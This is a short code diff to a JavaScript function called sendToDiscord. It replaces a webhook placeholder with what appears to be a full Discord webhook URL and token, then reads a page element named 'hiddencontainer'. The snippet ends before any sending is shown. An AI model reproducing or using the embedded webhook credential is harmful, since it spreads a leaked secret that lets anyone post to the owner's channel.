@@ -1,6 +1,6 @@
 function sendToDiscord() {
   const webhookUrl =
-    "YOUR_WEBHOOK_URL";
+    "https://discord.com/api/webhooks/1372219329352830997/7h3m7_G9grvgez6bYt6N-F_BlLS0zn041oQjbczDIjdF_zQYk0FDTHJTMwPdNweLTohD";
   const hiddenContainer = document.getElementById("hiddencontainer");
   let content = "";
 
